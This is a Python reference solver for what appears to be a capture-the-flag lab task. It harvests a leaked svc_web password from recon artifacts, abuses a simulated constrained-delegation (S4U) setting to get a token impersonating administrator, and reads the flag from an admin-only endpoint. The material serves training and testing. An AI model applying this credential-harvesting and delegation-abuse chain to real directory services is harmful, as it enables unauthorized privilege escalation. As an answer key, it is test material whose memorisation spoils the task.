"""Intended-path solver: recon leak, delegation config, simulated S4U, admin page."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

CREDS_RE = re.compile(r"uid=svc_web;pwd=([^;\s]+)")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url("target")

    # Earlier-phase recon artifact leaks the service credential.
    index = httpx.get(f"{base}/recon/index", timeout=10).json()
    creds = None
    for artifact in index["artifacts"]:
        text = httpx.get(f"{base}{artifact['path']}", timeout=10).text
        match = CREDS_RE.search(text)
        if match:
            creds = match.group(1)
            break
    if creds is None:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="delegate-like-a-dc",
                    ok=False,
                    detail="no svc_web credential found in recon artifacts",
                )
            ]
        )

    config = httpx.get(f"{base}/delegation/config", timeout=10).json()
    entry = next(e for e in config["delegation"] if e["account"] == "svc_web")
    allowed = entry["allowed_to_impersonate"]
    if "administrator" not in allowed:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="delegate-like-a-dc",
                    ok=False,
                    detail=f"unexpected impersonation allowlist: {allowed}",
                )
            ]
        )

    tgs = httpx.get(
        f"{base}/tgs",
        params={"impersonate": "administrator"},
        auth=("svc_web", creds),
        timeout=10,
    )
    token = tgs.json().get("token")
    if not token:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="delegate-like-a-dc",
                    ok=False,
                    detail=f"/tgs did not mint a token: {tgs.text[:200]}",
                )
            ]
        )

    res = httpx.get(
        f"{base}/dc/admin-only",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    detail = None
    if not captured:
        detail = "admin-only endpoint rejected the delegated token"
    return SolveResult(
        results=[
            TaskResult(
                task_id="delegate-like-a-dc",
                ok=bool(captured),
                captured=captured,
                detail=detail,
            )
        ]
    )
